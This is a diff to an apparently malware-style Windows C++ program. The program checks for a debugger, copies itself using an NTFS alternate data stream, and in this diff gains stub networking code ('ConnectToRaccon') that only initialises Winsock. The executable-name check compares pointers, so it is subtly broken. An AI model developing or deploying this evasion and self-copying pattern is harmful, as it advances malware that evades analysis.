@@ -5,6 +5,8 @@
 #include <cstdio>
 #include "ReaderHeader.h"
 
+#pragma comment(lib, "ws2_32.lib")
+
 #define NEW_STREAM L":Mommy"
 
 int SelfKurtCobain(void)
@@ -171,6 +173,18 @@ int CopyExists(void)
 	}
 }
 
+int ConnectToRaccon()
+{
+	WSADATA wsaData;
+
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	{
+		return EXIT_FAILURE;
+	}
+
+	return EXIT_SUCCESS;
+}
+
 int main(void)
 {
 	if (!IsDebugged())
@@ -183,9 +197,26 @@ int main(void)
 		if (CopyExists() == EXIT_FAILURE)
 		{
 			DoubleItSelf();
-			std::cout << "Not Debugged!" << std::endl;
+
+			WCHAR path[MAX_PATH * 2] = { 0 };
+
+			if (GetModuleFileNameW(NULL, path, (MAX_PATH * 2)) == 0)
+			{
+				return EXIT_FAILURE;
+			}
+
+			WCHAR* exeName = wcsrchr(path, L'\\');
+
+			if (exeName != L"muslc.exe")
+			{
+				ConnectToRaccon();
+			}
+
+			return EXIT_SUCCESS;
 		}
 
-		std::cout << "Not Debugged!" << std::endl;
+		ConnectToRaccon();
+
+		return EXIT_SUCCESS;
 	}
 }
